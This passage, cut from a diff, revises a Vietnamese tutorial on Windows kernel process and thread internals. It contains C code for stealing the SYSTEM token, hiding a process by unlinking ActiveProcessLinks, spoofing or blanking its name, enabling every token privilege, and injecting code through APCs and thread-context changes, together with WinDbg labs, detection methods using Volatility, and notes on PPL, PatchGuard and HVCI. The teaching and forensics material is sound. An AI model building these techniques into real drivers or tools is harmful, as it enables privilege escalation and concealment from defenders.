+ULONG_PTR self   = (ULONG_PTR)PsGetCurrentProcess();
+ULONG_PTR cur    = self;
 
-    HANDLE pid = *(HANDLE*)(system + 0x440); // UniqueProcessId offset
-    if ((ULONG_PTR)pid == 4) break; // Found SYSTEM
-}
+do {
+    cur = (ULONG_PTR)((PLIST_ENTRY)(cur + OFF_ACTIVELINKS))->Flink - OFF_ACTIVELINKS;
+    if (*(HANDLE*)(cur + OFF_PID) == (HANDLE)4) break;
+} while (cur != self);
 
-// Steal token
-ULONG_PTR systemToken = *(ULONG_PTR*)(system + 0x4B8); // Token offset
-systemToken &= ~0xF; // Clear ref count bits
-
-ULONG_PTR* currentToken = (ULONG_PTR*)(current + 0x4B8);
-*currentToken = systemToken;
+ULONG_PTR sysToken = *(ULONG_PTR*)(cur + OFF_TOKEN) & ~0xFULL;
+*(ULONG_PTR*)(self + OFF_TOKEN) = sysToken;
 ```
 
-> **Note:** Offsets (`0x448`, `0x440`, `0x4B8`) vary by Windows version. Production exploits phải dynamically resolve offsets hoặc use pattern matching.
+> **Offset cứng = giòn.** Đoạn trên chỉ đúng trên đúng build đó. Shellcode thực tế phải resolve offset động (quét `EPROCESS` theo pattern, hoặc đọc từ `nt!PsInitialSystemProcess` rồi suy ra layout). Hard-code offset là lý do phần lớn shellcode token-stealing trên GitHub chết trên Windows 11.
 
 ---
 
 ## DKOM (Direct Kernel Object Manipulation)
 
-DKOM techniques directly manipulate kernel structures để achieve goals như hiding processes, elevating privileges, etc.
+DKOM là sửa trực tiếp kernel structures thay vì gọi API. Nó không tạo ra log, không kích hoạt callback — đó là ưu điểm và cũng là lý do nó nguy hiểm cho chính hệ thống.
 
-### Technique 1: Process Hiding - Unlinking từ ActiveProcessLinks
-
-**Concept:** Remove process từ `PsActiveProcessHead` doubly-linked list.
+### Process hiding — unlink khỏi ActiveProcessLinks
 
 ```c
-// Get current process
-PEPROCESS pProcess = PsGetCurrentProcess();
+PEPROCESS pSelf = PsGetCurrentProcess();
+PLIST_ENTRY e = (PLIST_ENTRY)((PUCHAR)pSelf + ACTIVEPROCESSLINKS_OFFSET);
 
-// Get ActiveProcessLinks offset
-PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PUCHAR)pProcess + ACTIVEPROCESSLINKS_OFFSET);
+e->Blink->Flink = e->Flink;
+e->Flink->Blink = e->Blink;
 
-// Unlink from list
-pListEntry->Blink->Flink = pListEntry->Flink;
-pListEntry->Flink->Blink = pListEntry->Blink;
-
-// Point to self (optional, avoid crashes)
-pListEntry->Flink = pListEntry;
-pListEntry->Blink = pListEntry;
+// trỏ về chính nó để tránh dereference rác về sau
+e->Flink = e;
+e->Blink = e;
 ```
 
-**Result:** Process hidden từ:
-- Task Manager
-- Process Explorer
-- `PsGetProcessList()`
-- Most user-mode enumeration tools
+**Process sẽ ẩn khỏi:** Task Manager, Process Explorer, `tasklist`, `PsGetNextProcess`, phần lớn tool enumeration.
 
-**Still visible trong:**
-- Handle tables
-- Threads still scheduled
-- Memory forensics tools
-- Advanced detection (kernel callbacks)
+**Vẫn hiện ra ở:** handle table (`!handle`), thread list (`!thread`), `PspCidTable`, và mọi memory-forensics scan đọc trực tiếp pool.
 
-### Technique 2: Zero Out ImageFileName
+Đây là điểm quan trọng về mặt detection: unlink chỉ đánh lừa **một** nguồn sự thật. Bất kỳ tool nào có nguồn thứ hai (scan pool theo tag `Proc`, hoặc đối chiếu CID table) sẽ thấy process ngay. Volatility `psscan` vs `pslist` chính là cặp đối chiếu này.
 
-Simple technique để obfuscate process name:
+**Rủi ro:** nếu process bị unlink rồi thoát bình thường, kernel sẽ cố unlink lần nữa trên một list entry đã trỏ về chính nó → corruption. PoC phải re-link trước khi process kết thúc.
+
+### Zero ImageFileName
 
 ```c
-PEPROCESS pProcess = PsGetCurrentProcess();
-PUCHAR pImageFileName = (PUCHAR)pProcess + IMAGEFILENAME_OFFSET;
-
-// Overwrite with spaces or nulls
-RtlZeroMemory(pImageFileName, 15);
-// Or
-memset(pImageFileName, ' ', 15);
+PUCHAR pName = (PUCHAR)pSelf + IMAGEFILENAME_OFFSET;
+RtlZeroMemory(pName, 15);
+// hoặc giữ tên giả: RtlCopyMemory(pName, "svch0st.exe", 12);
 ```
 
-### Technique 3: Modify Token Privileges
+Rẻ, không gây crash, nhưng cũng rẻ để phát hiện: process có `ImageFileName` rỗng là bất thường rõ ràng trong bất kỳ process listing nào. Giá trị thật của nó là **làm hỏng tooling dựa trên tên** (rule matching theo tên process), không phải để ẩn.
 
-Enable tất cả privileges trong token:
+### Sửa bitmap privileges
 
 ```c
-typedef struct _SEP_TOKEN_PRIVILEGES {
-    ULONG64 Present;    // Bitmap of present privileges
-    ULONG64 Enabled;    // Bitmap of enabled privileges
-    ULONG64 EnabledByDefault; // Bitmap of default enabled
-} SEP_TOKEN_PRIVILEGES;
+PVOID raw = *(PVOID*)((PUCHAR)pSelf + TOKEN_OFFSET);
+PTOKEN pToken = (PTOKEN)((ULONG_PTR)raw & ~0xFULL);
 
-// Get token từ EPROCESS
-PVOID pToken = *(PVOID*)((PUCHAR)pProcess + TOKEN_OFFSET);
-pToken = (PVOID)((ULONG_PTR)pToken & ~0xF);
+PSEP_TOKEN_PRIVILEGES pPriv =
+    (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + TOKEN_PRIVILEGES_OFFSET);
 
-// Offset của Privileges structure trong TOKEN
-SEP_TOKEN_PRIVILEGES* pPrivileges = (SEP_TOKEN_PRIVILEGES*)((PUCHAR)pToken + PRIVILEGES_OFFSET);
-
-// Enable all privileges
-pPrivileges->Enabled = pPrivileges->Present;
+pPriv->Enabled = pPriv->Present;
 ```
+
+Chỉ bật được những gì đã có trong `Present` (xem phần TOKEN ở trên). Muốn có privilege mới thì phải sửa `Present`, và sửa `Present` trên token dùng chung sẽ ảnh hưởng mọi process chia sẻ token đó.
 
 ---
 
-## Thread Injection & Manipulation
+## Thread injection & manipulation
 
-### Technique 1: APC (Asynchronous Procedure Call) Injection
+### APC injection
 
-Inject code vào target thread qua user-mode APC:
+Cơ chế: queue một user-mode APC vào thread đích; APC chạy khi thread đó ở trạng thái alertable.
 
 ```c
-// Allocate memory trong target process
-PVOID pRemoteCode = NULL;
-SIZE_T codeSize = sizeof(shellcode);
+// 1. Cấp phát trong process đích
+PVOID pRemote = NULL;
+SIZE_T size = sizeof(shellcode);
+ZwAllocateVirtualMemory(hTargetProcess, &pRemote, 0, &size,
+                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-ZwAllocateVirtualMemory(
-    hTargetProcess,
-    &pRemoteCode,
-    0,
-    &codeSize,
-    MEM_COMMIT | MEM_RESERVE,
-    PAGE_EXECUTE_READWRITE
-);
+// 2. Ghi shellcode
+ZwWriteVirtualMemory(hTargetProcess, pRemote, shellcode, sizeof(shellcode), NULL);
 
-// Write shellcode
-ZwWriteVirtualMemory(
-    hTargetProcess,
-    pRemoteCode,
-    shellcode,
-    sizeof(shellcode),
-    NULL
-);
-
-// Queue user-mode APC
-PETHREAD pThread = ...; // Get target thread
+// 3. Queue APC
+KAPC apc;
 KeInitializeApc(
     &apc,
-    pThread,
+    (PKTHREAD)pTargetThread,       // KTHREAD, không phải ETHREAD
     OriginalApcEnvironment,
-    KernelRoutine,
-    RundownRoutine,
-    NormalRoutine,      // Points to shellcode
+    KernelRoutine,                 // chạy ở APC_LEVEL, kernel
+    RundownRoutine,                // chạy khi thread thoát
+    (PKNORMAL_ROUTINE)pRemote,     // chạy ở user-mode, pass-through
     UserMode,
-    NormalContext
+    NULL                           // NormalContext
 );
-
 KeInsertQueueApc(&apc, NULL, NULL, IO_NO_INCREMENT);
 ```
 
-### Technique 2: Thread Context Manipulation
+Lưu ý: `KeInitializeApc` nhận `PKTHREAD`, không phải `PETHREAD` — truyền sai kiểu vẫn compile (cùng địa chỉ base) nhưng đọc sai field nếu code sau đó dùng offset ETHREAD. Ngoài ra `KAPC` phải còn sống tới khi APC chạy xong; đặt nó trên stack của hàm gọi là lỗi use-after-free kinh điển.
 
-Hijack existing thread bằng cách modify context:
+### Sửa thread context — cách đúng
+
+Cách tiếp cận "sửa `KTRAP_FRAME`" hay được copy trên mạng thường sai vì `KTRAP_FRAME` chỉ tồn tại trên kernel stack khi thread **đang ở kernel mode**. Với thread đang suspend ở user-mode, context nằm trong `KTHREAD`, không phải trap frame bạn tự tính offset.
+
+Cách đúng là dùng context API documented:
 
 ```c
-PETHREAD pThread = ...; // Target thread
-PKTRAP_FRAME pTrapFrame = (PKTRAP_FRAME)((PUCHAR)pThread + TRAPFRAME_OFFSET);
+CONTEXT ctx = {0};
+ctx.ContextFlags = CONTEXT_CONTROL;      // RIP, RSP, segment registers
 
-// Suspend thread
-PsSuspendThread(pThread, NULL);
+PsGetContextThread(pTargetThread, &ctx, KernelMode);
 
-// Modify RIP to point to shellcode
-pTrapFrame->Rip = (ULONG64)shellcodeAddress;
+ctx.Rip = (ULONG64)pRemoteCode;          // trỏ tới shellcode đã ghi
+ctx.Rsp = (ULONG64)pRemoteStack;         // stack phải hợp lệ, không thì crash ngay
 
-// Modify stack pointer if needed
-pTrapFrame->Rsp = newStackPointer;
-
-// Resume thread
-PsResumeThread(pThread, NULL);
+PsSetContextThread(pTargetThread, &ctx, KernelMode);
 ```
+
+Ba giới hạn phải nhớ:
+
+- Thread phải suspend được — thread của process PPL/System sẽ trả `STATUS_ACCESS_DENIED`.
+- `Rsp` phải trỏ vào vùng memory đọc/ghi được trong address space của process đích. Đặt sai là fault ngay instruction đầu tiên.
+- `PsSetContextThread` **không** phải thay thế tổng quát cho việc sửa trap frame. Nó chỉ ghi context của thread đang suspend; nó không cho bạn chèn vào giữa một syscall đang chạy, và không sửa được kernel stack.
 
 ---
 
-## Lab Exercises với WinDbg
+## Lab WinDbg
 
-### Exercise 1: Enumerate Processes
+Phần này là cách tự verify mọi offset trong bài. Chạy trên VM Windows 10 22H2, kernel debug qua pipe hoặc network.
+
+### Bài 1 — Liệt kê process
 
 ```
 kd> !process 0 0
 **** NT ACTIVE PROCESS DUMP ****
-PROCESS fffffa8000000000
+PROCESS ffff8888`12340040
     SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
-    DirBase: 001a7000  ObjectTable: fffff8a000001000  HandleCount: 1234.
+    DirBase: 001a7000  ObjectTable: ffff8888`00001000  HandleCount: 1234.
     Image: System
 
-PROCESS fffffa8012345678
-    SessionId: 1  Cid: 1a2c    Peb: 7fffffde000  ParentCid: 09b4
-    DirBase: 6d8a9000  ObjectTable: fffff8a001234567  HandleCount: 234.
+PROCESS ffff8888`12345680
+    SessionId: 1  Cid: 1a2c    Peb: 00000000`00fde000  ParentCid: 09b4
+    DirBase: 6d8a9000  ObjectTable: ffff8888`00123400  HandleCount: 234.
     Image: explorer.exe
 ```
 
-### Exercise 2: Examine EPROCESS Structure
+### Bài 2 — Đọc EPROCESS
 
 ```
-kd> !process explorer.exe
-PROCESS fffffa8012345678
-    SessionId: 1  Cid: 1a2c    Peb: 7fffffde000  ParentCid: 09b4
-    ...
-
-kd> dt nt!_EPROCESS fffffa8012345678
-   +0x000 Pcb              : _KPROCESS
-   +0x438 ProcessLock      : _EX_PUSH_LOCK
-   +0x440 UniqueProcessId  : 0x00001a2c  // PID
-   +0x448 ActiveProcessLinks : _LIST_ENTRY
-   +0x4b8 Token            : _EX_FAST_REF
-   +0x5a8 ImageFileName    : [15]  "explorer.exe"
-
-kd> dx -r1 ((nt!_EPROCESS *)0xfffffa8012345678)
+kd> dt nt!_EPROCESS ffff8888`12345680
+   +0x000 Pcb                 : _KPROCESS
+   +0x438 ProcessLock         : _EX_PUSH_LOCK
+   +0x440 UniqueProcessId     : 0x00000000`00001a2c
+   +0x448 ActiveProcessLinks  : _LIST_ENTRY
+   +0x4b8 Token               : _EX_FAST_REF
+   +0x5a8 ImageFileName       : [15]  "explorer.exe"
 ```
 
-### Exercise 3: Token Analysis
+Đối chiếu với bảng offset ở trên — đây là bước bắt buộc trước khi viết bất kỳ PoC nào.
+
+### Bài 3 — Đọc token
 
 ```
-kd> !token fffffa8012345678
-Token: fffff8a001234567
-User: S-1-5-21-123456-789-1011-1000 (DESKTOP-ABC\User)
+kd> !token 0xffff8888`12345680
+_TOKEN 0xffff8888`0a1b2c30
+User: S-1-5-21-1234567890-1011-1000 (DESKTOP-ABC\User)
 Groups:
- S-1-5-21-123456-789-1011-513 (DESKTOP-ABC\None)
- S-1-5-32-545 (BUILTIN\Users)
- S-1-1-0 (Everyone)
+  S-1-5-21-1234567890-1011-513 (DESKTOP-ABC\None)
+  S-1-5-32-545 (BUILTIN\Users)
+  S-1-1-0 (Everyone)
 Privs:
- 0x000000013 SeShutdownPrivilege           Attributes - Enabled
- 0x000000017 SeChangeNotifyPrivilege       Attributes - Enabled Default
+  0x000000013 SeShutdownPrivilege           Attributes - Enabled
+  0x000000017 SeChangeNotifyPrivilege       Attributes - Enabled Default
 ```
 
-### Exercise 4: Find Token Offset Dynamically
+### Bài 4 — Tìm offset động (đừng hard-code)
 
 ```
 kd> r $t0 = poi(nt!PsInitialSystemProcess)
-
-kd> ? $t0
-Evaluate expression: -8796090842232 = fffffa8000000000
-
 kd> dt nt!_EPROCESS $t0 Token
    +0x4b8 Token : _EX_FAST_REF
-
-kd> ? 0x4b8
-Evaluate expression: 1208 = 00000000`000004b8
 ```
+
+Cách này lấy offset từ chính kernel đang chạy — đúng cho mọi build, kể cả khi bạn không biết máy đang là 19045 hay 22631.
 
 ---
 
-## Detection & Forensics
+## Detection & forensics
 
-### Detecting DKOM Techniques
+### Cross-view: đối chiếu nhiều nguồn sự thật
 
-**Method 1: Cross-validate với PspCidTable**
-
-```
-# Process list từ ActiveProcessLinks
-!process 0 0
-
-# Process list từ Handle table
-!handle 0 f Process
-
-# Compare lists - missing entries = hidden processes
-```
-
-**Method 2: Scan memory cho EPROCESS tags**
+Nguyên tắc: DKOM chỉ sửa được một nguồn. Tool nào có nguồn thứ hai sẽ thấy process ẩn.
 
 ```
-kd> s -d 0 L?0xffffffffffffffff 0x50636f72  # 'Proc' pool tag
+kd> !process 0 0            # nguồn 1: ActiveProcessLinks
+kd> !handle 0 0 Process     # nguồn 2: handle table
+kd> !thread                 # nguồn 3: thread list
 ```
 
-**Method 3: Check process callbacks**
+Process xuất hiện ở nguồn 2 và 3 nhưng vắng ở nguồn 1 = đã bị unlink.
+
+### Scan pool theo tag
+
+Pool tag của `EPROCESS` là `Proc`, lưu dưới dạng DWORD little-endian `0x636f7250`:
 
 ```
-kd> !filecache
-
-kd> dt nt!_OBJECT_TYPE *(poi(nt!PsProcessType))
+kd> s -d 0 L?0xffffffffffffffff 0x636f7250
 ```
 
-### Memory Forensics với Volatility
+So sánh số hit với số process trong `!process` — chênh lệch là process ẩn.
+
+### Volatility 3 (cú pháp hiện hành)
 
 ```bash
-# List processes
-volatility -f memory.dmp --profile=Win10x64 pslist
+# process list từ ActiveProcessLinks
+vol -f memory.dmp windows.pslist
 
-# Find hidden processes
-volatility -f memory.dmp --profile=Win10x64 psscan
+# scan pool — thấy cả process đã bị unlink
+vol -f memory.dmp windows.psscan
 
-# Check for unlinked processes
-volatility -f memory.dmp --profile=Win10x64 psxview
+# đối chiếu chéo nhiều nguồn trong một lệnh
+vol -f memory.dmp windows.psxview
 
-# Dump process token
-volatility -f memory.dmp --profile=Win10x64 getsids -p 1234
+# token / SID của một process
+vol -f memory.dmp windows.getsids --pid 1234
 ```
+
+`pslist` vs `psscan` là bài kiểm tra kinh điển: `pslist` đi theo list (bị DKOM đánh lừa), `psscan` quét pool (không bị). Volatility 2 dùng `--profile=Win10x64`; Volatility 3 bỏ profile, tự nhận diện.
+
+### Process/thread callbacks của EDR
+
+EDR đăng ký callback qua `PsSetCreateProcessNotifyRoutineEx`; các routine này nằm trong mảng `nt!PspCreateProcessNotifyRoutine`. Rootkit có thể vô hiệu hoá bằng cách zero phần tử trong mảng — đó là lý do các EDR hiện đại dùng PPL để bảo vệ chính vùng memory đó, khiến thao tác này fail thay vì im lặng thành công.
 
 ---
 
-## Modern Mitigations
+## Mitigations hiện đại — và cái gì còn dùng được
 
-### Protected Processes (PP) & PPL
+### Protected Process Light (PPL)
 
-**Protected Process Light (PPL):**
-- Introduced trong Windows 8.1
-- Prevents tampering từ non-protected processes
-- Even Administrator cannot debug/inject
+Có từ Windows 8.1. Process được gắn protection level (`PsProtectedTypeProtectedLight` + signer như `WinTcb`, `Antimalware`, `Lsa`) sẽ chặn mọi thao tác `OpenProcess`/`WriteProcessMemory`/`SetThreadContext` từ process có mức thấp hơn — kể cả Administrator. Với kernel driver, việc sửa `EPROCESS` của process PPL cũng bị chặn nếu HVCI bật.
 
-**Protection Levels:**
-```c
-typedef enum _PS_PROTECTED_TYPE {
-    PsProtectedTypeNone = 0,
-    PsProtectedTypeProtectedLight = 1,
-    PsProtectedTypeProtected = 2
-} PS_PROTECTED_TYPE;
+Hệ quả thực tế: lsass, các EDR service và Defender không còn là mục tiêu của thread injection từ user-mode.
 
-typedef enum _PS_PROTECTED_SIGNER {
-    PsProtectedSignerNone = 0,
-    PsProtectedSignerAuthenticode,
-    PsProtectedSignerCodeGen,
-    PsProtectedSignerAntimalware,
-    PsProtectedSignerLsa,
-    PsProtectedSignerWindows,
-    PsProtectedSignerWinTcb,
-    PsProtectedSignerMax
-} PS_PROTECTED_SIGNER;
-```
+### PatchGuard (Kernel Patch Protection)
 
-**Bypass:** Kernel-mode code có thể still manipulate, nhưng requires disabling PatchGuard.
+Kiểm tra định kỳ tính toàn vẹn của các structure và hàm kernel quan trọng (SSDT, IDT, một số field `EPROCESS`, code của `ntoskrnl`). Vi phạm → bugcheck `CRITICAL_STRUCTURE_CORRUPTION` (0x109) sau vài phút.
 
-### Process/Thread Callbacks
+Điều quan trọng: PatchGuard **không** chặn token stealing hay unlink `ActiveProcessLinks` — nó không kiểm tra những field đó. Nó chặn sửa code và một số con trỏ hàm. Đây là lý do DKOM vẫn "hoạt động" trên máy bật PatchGuard, trong khi hooking thì không.
 
-Windows allows registration của callbacks cho process/thread events:
+### HVCI / VBS
 
-```c
-// Register process callback
-PsSetCreateProcessNotifyRoutineEx(
-    ProcessNotifyCallback,
-    FALSE  // Remove = FALSE (add callback)
-);
+Hypervisor-enforced Code Integrity, bật mặc định trên Windows 11 mới. Hai hệ quả:
+- Driver phải được ký và pass WHQL-compatible policy mới nạp được → driver tự viết của bạn **không nạp được** nếu không bật test signing.
+- Kernel memory chứa structure của process được bảo vệ không ghi được từ kernel, ngay cả khi bạn đã ở ring 0.
 
-VOID ProcessNotifyCallback(
-    PEPROCESS Process,
-    HANDLE ProcessId,
-    PPS_CREATE_NOTIFY_INFO CreateInfo
-) {
-    if (CreateInfo != NULL) {
-        // Process being created
-        DbgPrint("Process created: %wZ\n", CreateInfo->ImageFileName);
-    } else {
-        // Process exiting
-        DbgPrint("Process exiting: PID %d\n", ProcessId);
-    }
-}
-```
+### Vậy hiện tại cái gì còn dùng được?
 
-**Security Use:** EDR/AV drivers register callbacks để monitor suspicious activity.
+| Kỹ thuật | Win10 không HVCI | Win11 có HVCI |
+|---|---|---|
+| Token stealing qua EPROCESS | Chạy | Cần bypass HVCI |
+| Unlink ActiveProcessLinks | Chạy | Chạy (với process không protected) |
+| Sửa ImageFileName | Chạy | Chạy |
+| APC injection vào process thường | Chạy | Chạy |
+| Injection vào PPL (lsass, EDR) | Cần driver | Hầu như không |
+| Hook SSDT / patch code | PatchGuard kill | PatchGuard + HVCI kill |
 
-**Evasion:** Kernel rootkits có thể unregister callbacks hoặc patch callback array.
+Đường đi thực tế hiện nay không phải tự viết driver mà là **BYOVD** — nạp một driver có chữ ký hợp lệ nhưng có lỗ hổng (nhiều driver của các hãng antivirus, phần mềm phần cứng), dùng nó để ghi kernel memory. Đó là lý do Microsoft liên tục thu hồi chữ ký driver và duy trì danh sách blocklist.
 
 ---
 
-## Wrapup
+## Kết
 
-Understanding Windows process và thread internals - từ `EPROCESS`/`ETHREAD` structures đến token manipulation và DKOM techniques - là absolutely critical cho kernel exploitation và rootkit development.
+Từ `EPROCESS`/`ETHREAD` đến token stealing và DKOM, các kỹ thuật trong bài đều xoay quanh một ý: **kernel lưu mọi thứ trong structure, và structure đó sửa được**. Access check không đọc "danh tính" trừu tượng — nó đọc token. Process list không phải sự thật tuyệt đối — nó là một linked list.
 
-Key takeaways:
+Ba điều đáng nhớ:
 
-- **EPROCESS/ETHREAD structures** chứa tất cả process/thread metadata
-- **Token stealing** là classic privilege escalation method
-- **DKOM techniques** allow process hiding và object manipulation
-- **ActiveProcessLinks unlinking** hides processes từ standard enumeration
-- **Thread injection** enables code execution trong target processes
-- **Modern mitigations** như PPL và callbacks make exploitation harder
+- **`EPROCESS.Token` là `EX_FAST_REF`** — phải mask 4 bit thấp, và phải giữ reference.
+- **Unlink chỉ đánh lừa một nguồn sự thật** — `psscan`, handle table và thread list vẫn thấy process.
+- **Không có API documented nào để gán primary token tuỳ ý** — mọi PoC "sạch" đều phải là kernel write, và đó chính là thứ HVCI sinh ra để chặn.
 
-Knowledge này forms foundation cho advanced Windows exploitation, rootkit development, và memory forensics.
+Phần tiếp theo của series: `ETHREAD`/`KTHREAD` scheduling internals, và cách `KTHREAD.WaitListHead` bị dùng trong các kỹ thuật thread hiding.
 
 ---
 
 ## References
 
-**Books:**
-- **Windows Internals, Part 1** (Chapters 3-4: Processes & Threads) - Russinovich, Solomon, Ionescu
-- **Rootkits: Subverting the Windows Kernel** - Greg Hoglund, James Butler
-- **The Rootkit Arsenal** - Bill Blunden
+**Books**
+- *Windows Internals, Part 1* (7th ed.) — Russinovich, Ionescu, Solomon. Chapter 3–4: Processes & Threads.
+- *Rootkits: Subverting the Windows Kernel* — Greg Hoglund, James Butler. Nguồn gốc của DKOM.
+- *The Rootkit Arsenal* (2nd ed.) — Bill Blunden.
+- *Windows Kernel Programming* — Pavel Yosifovich.
 
-**Papers:**
-- "Token Kidnapping" - Cesar Cerrudo
-- "DKOM (Direct Kernel Object Manipulation)" - Jamie Butler, Greg Hoglund
-- "Bypassing Windows Kernel Security Mitigations" - Multiple authors
+**Papers**
+- "Token Kidnapping" — Cesar Cerrudo (2008). Nguồn gốc của token abuse trên Windows.
+- "DKOM (Direct Kernel Object Manipulation)" — Jamie Butler, Greg Hoglund.
+- "Subverting the Windows Kernel: Hooking" — Hoglund.
 
-**Tools:**
-- [Process Hacker](https://processhacker.sourceforge.io/) - Advanced process viewer
-- [System Informer](https://github.com/winsiderss/systeminformer) - System exploration
-- [Volatility](https://www.volatilityfoundation.org/) - Memory forensics framework
+**Tools**
+- [System Informer](https://systeminformer.sourceforge.io/) — process viewer, bản kế thừa của Process Hacker
+- [WinDbg](https://learn.microsoft.com/windows-hardware/drivers/debugger/) — kernel debugging
+- [Volatility 3](https://github.com/volatilityfoundation/volatility3) — memory forensics
+- [Vergilius Project](https://www.vergiliusproject.com/) — offset của kernel struct theo từng build
 
 ---
 
